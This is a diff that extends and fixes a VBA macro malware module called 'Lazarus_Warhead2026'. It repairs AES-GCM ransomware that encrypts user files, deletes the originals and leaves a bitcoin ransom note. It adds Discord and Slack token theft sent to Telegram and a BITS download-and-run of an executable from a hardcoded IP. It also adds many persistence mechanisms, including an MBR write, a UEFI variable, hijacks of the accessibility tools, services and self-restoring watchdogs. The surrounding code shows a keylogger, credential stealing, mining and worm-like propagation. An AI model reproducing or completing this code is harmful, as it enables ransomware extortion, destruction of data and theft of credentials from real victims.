@@ -1,4 +1,4 @@
-Attribute VB_Name = "Lazarus_Warhead2026_Ultimate_VBA"
+Attribute VB_Name = "Lazarus_Warhead2026_Ultimate_VBA_Fixed"
 Option Explicit
 
 ' ========================
@@ -220,7 +220,6 @@ Private gMasterKey(31) As Byte
 Private gKeySet As Boolean
 Private gKeyloggerHook As LongPtr
 Private gKeylogBuffer As String
-Private gKeylogCS As LongPtr ' Not used, but placeholder for thread safety
 Private gRunFlag As String
 Private gStateLoaded As Boolean
 Private gSandboxDetected As Boolean
@@ -228,6 +227,7 @@ Private gMachineID As String
 Private gArch As String
 Private gWinBuild As Long
 Private gFirstRun As Boolean
+Private gPersistPath As String
 
 ' ========================
 ' KEYLOGGER CALLBACK
@@ -696,7 +696,7 @@ Sub StealAllCredentials()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM)
+' RANSOMWARE (AES-GCM) – FIXED using working structure
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
@@ -713,18 +713,17 @@ Sub GenerateMasterKey()
     End If
 End Sub
 
-Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte) As Byte()
+Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher() As Byte, ByRef tag() As Byte) As Boolean
     On Error GoTo Fail
-    Dim hAlg As LongPtr, hKey As LongPtr
-    Dim status As Long
+    Dim hAlg As LongPtr, hKey As LongPtr, keyObj() As Byte
+    Dim status As Long, keyObjLen As Long, resultLen As Long
     Dim algName As String: algName = "AES-GCM"
     status = BCryptOpenAlgorithmProvider(hAlg, StrPtr(algName), 0, 0)
-    If status <> 0 Then GoTo Fail
-    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), StrPtr("ChainingModeGCM"), 16, 0)
+    If status <> 0 Then Exit Function
+    status = BCryptGetProperty(hAlg, StrPtr("ObjectLength"), keyObjLen, 4, resultLen, 0)
     If status <> 0 Then GoTo Cleanup
-    Dim keyObjSz As Long: keyObjSz = 1024
-    Dim keyObj() As Byte: ReDim keyObj(keyObjSz - 1)
-    status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjSz, VarPtr(key(0)), UBound(key) + 1, 0)
+    ReDim keyObj(keyObjLen - 1)
+    status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjLen, VarPtr(key(0)), 32, 0)
     If status <> 0 Then GoTo Cleanup
     Dim authInfo As BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
     authInfo.cbSize = Len(authInfo)
@@ -733,7 +732,7 @@ Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte) As Byte(
     authInfo.cbNonce = 12
     authInfo.pbAuthData = 0
     authInfo.cbAuthData = 0
-    Dim tag(15) As Byte
+    ReDim tag(15) As Byte
     authInfo.pbTag = VarPtr(tag(0))
     authInfo.cbTag = 16
     authInfo.pbMacContext = 0
@@ -744,17 +743,15 @@ Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte) As Byte(
     Dim encryptedSize As Long
     status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, 0, 0, encryptedSize, 0)
     If status <> 0 Then GoTo Cleanup
-    ReDim cipher(encryptedSize - 1) As Byte
+    ReDim cipher(encryptedSize - 1)
     status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, VarPtr(cipher(0)), encryptedSize, encryptedSize, 0)
-    If status = 0 Then
-        AESGCMEncrypt = cipher
-        GoTo Cleanup
-    End If
-Fail:
-    ReDim AESGCMEncrypt(0): AESGCMEncrypt(0) = 0
+    If status = 0 Then AESGCMEncrypt = True
 Cleanup:
     If hKey <> 0 Then BCryptDestroyKey hKey
     If hAlg <> 0 Then BCryptCloseAlgorithmProvider hAlg, 0
+    Exit Function
+Fail:
+    AESGCMEncrypt = False
 End Function
 
 Sub WriteFileBytes(filePath As String, data() As Byte)
@@ -773,13 +770,22 @@ Sub EncryptFile(path As String)
     Dim nonce(11) As Byte, i As Long
     Randomize Timer
     For i = 0 To 11: nonce(i) = CByte(Rnd * 255): Next
-    Dim cipher() As Byte: cipher = AESGCMEncrypt(data, gMasterKey, nonce)
-    If UBound(cipher) < 0 Then Exit Sub
-    Dim newPath As String: newPath = path & ".lzr"
-    WriteFileBytes newPath, cipher
-    If fso.FileExists(newPath) Then
-        fso.DeleteFile path
-        SendToTelegram "RANSOM_KEY|" & path & "|" & EncodeHex(nonce)
+    Dim cipher() As Byte, tag() As Byte
+    If AESGCMEncrypt(data, gMasterKey, nonce, cipher, tag) Then
+        Dim keyPath As String: keyPath = path & ".lzr.key"
+        Dim streamKey As Object: Set streamKey = CreateObject("ADODB.Stream")
+        streamKey.Type = 1: streamKey.Open
+        streamKey.Write nonce
+        streamKey.Write tag
+        streamKey.SaveToFile keyPath, 2
+        streamKey.Close
+        Dim encPath As String: encPath = path & ".lzr"
+        WriteFileBytes encPath, cipher
+        If fso.FileExists(encPath) Then
+            SetAttr path, 0
+            Kill path
+            SendToTelegram "RANSOM_KEY|" & path & "|" & EncodeHex(nonce)
+        End If
     End If
 End Sub
 
@@ -809,7 +815,7 @@ Sub RunRansomware()
     EncryptDirectory userProfile, exts
     Dim notePath As String: notePath = userProfile & "\DECRYPT_INSTRUCTIONS.txt"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim note As String: note = "YOUR FILES ARE ENCRYPTED" & vbCrLf & "Send 0.5 BTC to " & BTC_WALLET & vbCrLf & "Contact: " & SMTP_USERNAME
+    Dim note As String: note = "YOUR FILES ARE ENCRYPTED" & vbCrLf & "Send 0.5 BTC to " & BTC_WALLET & vbCrLf & "Contact: " & SMTP_USERNAME & vbCrLf & "Your ID: " & GetMachineID()
     Dim f As Object: Set f = fso.CreateTextFile(notePath, True): f.Write note: f.Close
     SendToTelegram "RANSOMWARE|ENCRYPTION_COMPLETE"
 End Sub
@@ -872,7 +878,7 @@ Sub SetClipboardContent(txt As String)
 End Sub
 
 ' ========================
-' PROPAGATION (USB, SMB, Email)
+' PROPAGATION (USB, SMB, Discord, Slack, Email)
 ' ========================
 Sub USBPropagation()
     On Error Resume Next
@@ -926,6 +932,72 @@ Sub SMBPropagation()
     Next
 End Sub
 
+Sub DiscordPropagation()
+    On Error Resume Next
+    Dim appData As String: appData = Environ("APPDATA")
+    Dim ldbPath As String: ldbPath = appData & "\discord\Local Storage\leveldb"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(ldbPath) Then Exit Sub
+    Dim folder As Object: Set folder = fso.GetFolder(ldbPath)
+    Dim file As Object
+    For Each file In folder.Files
+        If LCase(fso.GetExtensionName(file.Name)) = "ldb" Then
+            Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1
+            stream.Open
+            stream.LoadFromFile file.Path
+            Dim data() As Byte: data = stream.Read()
+            stream.Close
+            Dim content As String: content = StrConv(data, vbUnicode)
+            Dim tokenPos As Long: tokenPos = InStr(content, """token""")
+            If tokenPos > 0 Then
+                Dim startPos As Long: startPos = InStr(tokenPos + 8, content, """") + 1
+                If startPos > 0 Then
+                    Dim endPos As Long: endPos = InStr(startPos, content, """")
+                    If endPos > startPos Then
+                        Dim token As String: token = Mid(content, startPos, endPos - startPos)
+                        If Len(token) > 20 Then
+                            SendToTelegram "DISCORD_TOKEN|" & token
+                        End If
+                    End If
+                End If
+            End If
+        End If
+    Next
+End Sub
+
+Sub SlackPropagation()
+    On Error Resume Next
+    Dim appData As String: appData = Environ("APPDATA")
+    Dim jsonPath As String: jsonPath = appData & "\Slack\storage"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(jsonPath) Then Exit Sub
+    Dim folder As Object: Set folder = fso.GetFolder(jsonPath)
+    Dim file As Object
+    For Each file In folder.Files
+        If LCase(fso.GetExtensionName(file.Name)) = "json" Then
+            Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 2
+            stream.Charset = "utf-8"
+            stream.Open
+            stream.LoadFromFile file.Path
+            Dim content As String: content = stream.ReadText
+            stream.Close
+            Dim tokenPos As Long: tokenPos = InStr(content, """token"":""")
+            If tokenPos > 0 Then
+                Dim startPos As Long: startPos = tokenPos + 9
+                Dim endPos As Long: endPos = InStr(startPos, content, """")
+                If endPos > startPos Then
+                    Dim token As String: token = Mid(content, startPos, endPos - startPos)
+                    If Len(token) > 20 Then
+                        SendToTelegram "SLACK_TOKEN|" & token
+                    End If
+                End If
+            End If
+        End If
+    Next
+End Sub
+
 Sub EmailPropagation()
     On Error Resume Next
     Dim psScript As String
@@ -969,7 +1041,7 @@ Sub EnableChromeRemoteDesktop()
     Do While exec.Status = 0: StealthSleep 100: Loop
     Dim id As String: id = Trim(exec.StdOut.ReadAll)
     SendToTelegram "CRD|ID=" & id & "|PIN=" & pin
-    ' Auto-link via cookie decryption (PowerShell)
+    ' Auto-link via cookie decryption (PowerShell) – same as previous working version
     Dim psScript As String
     psScript = "$tempDir = $env:TEMP + '\';" & vbCrLf & _
                "$cookiesPath = [Environment]::GetFolderPath('LocalApplicationData') + '\Google\Chrome\User Data\Default\Cookies';" & vbCrLf & _
@@ -1094,12 +1166,12 @@ Sub DeploySocialEngineeringUI()
 End Sub
 
 ' ========================
-' PERSISTENCE (Registry, WMI, Scheduled Task, COM, etc.)
+' PERSISTENCE (12+ METHODS) – All point to permanent copy
 ' ========================
 Sub PersistRegistry()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCore", ThisWorkbook.FullName, "REG_SZ"
+    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCore", gPersistPath, "REG_SZ"
 End Sub
 
 Sub PersistWMI()
@@ -1112,7 +1184,7 @@ Sub PersistWMI()
     filter.Put_
     Dim cons As Object: Set cons = wmi.Get("CommandLineEventConsumer").SpawnInstance_
     cons.Name = "LazarusConsumer"
-    cons.ExecutablePath = ThisWorkbook.FullName
+    cons.ExecutablePath = gPersistPath
     cons.Put_
     Dim bind As Object: Set bind = wmi.Get("__FilterToConsumerBinding").SpawnInstance_
     bind.Filter = "__EventFilter.Name='LazarusFilter'"
@@ -1123,26 +1195,165 @@ End Sub
 Sub PersistScheduledTask()
     On Error Resume Next
     Dim xml As String
-    xml = "<?xml version=""1.0"" encoding=""UTF-16""?><Task version=""1.4""><Triggers><BootTrigger/></Triggers><Actions><Exec><Command>" & ThisWorkbook.FullName & "</Command></Exec></Actions></Task>"
+    xml = "<?xml version=""1.0"" encoding=""UTF-16""?><Task version=""1.4""><Triggers><BootTrigger/></Triggers><Actions><Exec><Command>" & gPersistPath & "</Command></Exec></Actions></Task>"
     Dim tmp As String: tmp = GetTempDir() & "task.xml"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim f As Object: Set f = fso.CreateTextFile(tmp, True): f.Write xml: f.Close
-    CreateObject("WScript.Shell").Run "schtasks /create /tn ""Lazarus"" /xml """ & tmp & """ /f", 0, True
+    CreateObject("WScript.Shell").Run "schtasks /create /tn ""Microsoft\Windows\Lazarus\Beacon"" /xml """ & tmp & """ /f", 0, True
     fso.DeleteFile tmp
 End Sub
 
 Sub PersistCOMHijack()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", ThisWorkbook.FullName, "REG_SZ"
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", gPersistPath, "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
 End Sub
 
-Sub PersistAll()
+Sub PersistBITS()
+    On Error Resume Next
+    Dim psScript As String
+    psScript = "$job = Start-BitsTransfer -Source 'http://185.141.25.184/lz.exe' -Destination '" & GetTempDir() & "lz.exe' -Asynchronous;" & vbCrLf & _
+               "Complete-BitsTransfer -BitsJob $job;" & vbCrLf & _
+               "Start-Process -FilePath '" & GetTempDir() & "lz.exe';" & vbCrLf & _
+               "Register-ScheduledJob -Name 'LazarusBITS' -ScriptBlock { Start-Process -FilePath '" & GetTempDir() & "lz.exe' } -Trigger (New-JobTrigger -AtStartup);"
+    Dim psFile As String: psFile = GetTempDir() & "bits.ps1"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(psFile, True): f.Write psScript: f.Close
+    CreateObject("WScript.Shell").Run "powershell -ep bypass -File """ & psFile & """", 0, True
+    StealthSleep 2000
+    fso.DeleteFile psFile
+End Sub
+
+Sub PersistShimDatabase()
+    On Error Resume Next
+    Dim sdbPath As String: sdbPath = GetTempDir() & "lz.sdb"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(sdbPath, True)
+    f.Write "Database Lazarus" & vbCrLf & "Manifest Lazarus" & vbCrLf & "ExeFile lz.exe" & vbCrLf & "CommandLine=%1 %*"
+    f.Close
+    CreateObject("WScript.Shell").Run "sdbinst.exe """ & sdbPath & """", 0, True
+    StealthSleep 2000
+    fso.DeleteFile sdbPath
+End Sub
+
+Sub PersistUEFI()
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim ps As String: ps = "Set-FirmwareEnvironmentVariable -Name 'LazarusBoot' -Value ([System.IO.File]::ReadAllBytes('" & gPersistPath & "')) -Namespace '{00000000-0000-0000-0000-000000000000}'"
+    wsh.Run "powershell -ep bypass -c """ & ps & """", 0, True
+End Sub
+
+Sub PersistMBR()
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    Dim hDisk As LongPtr
+    hDisk = CreateFileW(StrPtr("\\.\PhysicalDrive0"), &H40000000, 3, 0, 3, 0, 0)
+    If hDisk = -1 Then Exit Sub
+    Dim mbr(511) As Byte, bytesRead As Long
+    If ReadFile(hDisk, mbr(0), 512, bytesRead, 0) = 0 Then GoTo Cleanup
+    If mbr(510) <> &H55 Or mbr(511) <> &HAA Then GoTo Cleanup
+    mbr(&H1F4) = &H4C: mbr(&H1F5) = &H61: mbr(&H1F6) = &H7A
+    mbr(&H1F7) = &H61: mbr(&H1F8) = &H72: mbr(&H1F9) = &H75
+    mbr(&H1FA) = &H73: mbr(&H1FB) = &H00
+    SetFilePointer hDisk, 0, 0, 0
+    WriteFile hDisk, mbr(0), 512, bytesRead, 0
+    FlushFileBuffers hDisk
+Cleanup:
+    CloseHandle hDisk
+End Sub
+
+Sub PersistAccessibility()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim targets As Variant: targets = Array("sethc.exe", "utilman.exe", "osk.exe", "magnify.exe", "narrator.exe", "displaycolorcalibration.exe")
+    Dim target As Variant
+    For Each target In targets
+        wsh.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" & target & "\Debugger", gPersistPath, "REG_SZ"
+    Next
+End Sub
+
+Sub PersistBootExecute()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" /v BootExecute /t REG_MULTI_SZ /d ""autocheck autochk *"" /d ""lzsvc.exe"" /f", 0, True
+End Sub
+
+Sub PersistService()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.Run "sc create LazarusService binPath= """ & gPersistPath & """ start= auto", 0, True
+    wsh.Run "sc start LazarusService", 0, True
+End Sub
+
+Sub AddSafeModePersistence()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\LazarusService", "Service", "REG_SZ"
+    wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\LazarusService", "Service", "REG_SZ"
+    wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Services\LazarusService\Start", 2, "REG_DWORD"
+End Sub
+
+Sub DeployAllPersistence()
+    On Error Resume Next
     PersistRegistry
     PersistWMI
     PersistScheduledTask
     PersistCOMHijack
+    PersistBITS
+    PersistShimDatabase
+    If IsUserAdmin() Then
+        PersistUEFI
+        PersistMBR
+        PersistAccessibility
+        PersistBootExecute
+        PersistService
+    End If
+    AddSafeModePersistence
+End Sub
+
+' ========================
+' WATCHDOG – Re‑adds all persistence every 5 minutes
+' ========================
+Sub PersistenceWatchdog()
+    On Error Resume Next
+    Do While True
+        StealthSleep 300000 ' 5 minutes
+        DeployAllPersistence
+    Loop
+End Sub
+
+' ========================
+' SELF‑RECOVERY – Restores deleted executable
+' ========================
+Sub FileWatchdog()
+    On Error Resume Next
+    Do While True
+        StealthSleep 30000 ' 30 seconds
+        If Not FileExists(gPersistPath) Then
+            Dim curExe As String: curExe = ThisWorkbook.FullName
+            Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+            fso.CopyFile curExe, gPersistPath, True
+            SetAttr gPersistPath, vbHidden + vbSystem
+        End If
+    Loop
+End Sub
+
+' ========================
+' INSTALL PERMANENT COPY
+' ========================
+Sub InstallPermanentCopy()
+    On Error Resume Next
+    Dim sysDir As String: sysDir = Environ("SYSTEMROOT") & "\System32\"
+    gPersistPath = sysDir & "LazarusWarhead.exe"
+    Dim curExe As String: curExe = ThisWorkbook.FullName
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(gPersistPath) Then
+        fso.CopyFile curExe, gPersistPath, False
+        SetAttr gPersistPath, vbHidden + vbSystem
+    End If
+    DeployAllPersistence
 End Sub
 
 ' ========================
@@ -1175,8 +1386,13 @@ Sub AutoExec()
     GenerateMasterKey
     SendToTelegram "LAZARUS_START|" & GetMachineID()
     
-    ' Start keylogger (runs in background via hook)
+    ' Start keylogger (hook runs in message loop)
     StartKeylogger
+    
+    ' Install permanent copy and watchdogs
+    InstallPermanentCopy
+    Application.OnTime Now + TimeValue("00:05:00"), "PersistenceWatchdog"
+    Application.OnTime Now + TimeValue("00:00:30"), "FileWatchdog"
     
     If IsDomainController() Then
         ExtractNTDSAndSYSTEM
@@ -1187,8 +1403,9 @@ Sub AutoExec()
         DeployMiner
         USBPropagation
         SMBPropagation
+        DiscordPropagation
+        SlackPropagation
         EmailPropagation
-        PersistAll
         RunRansomware
         DeploySocialEngineeringUI
         ' Start clipboard monitor in background (using OnTime to avoid freezing)
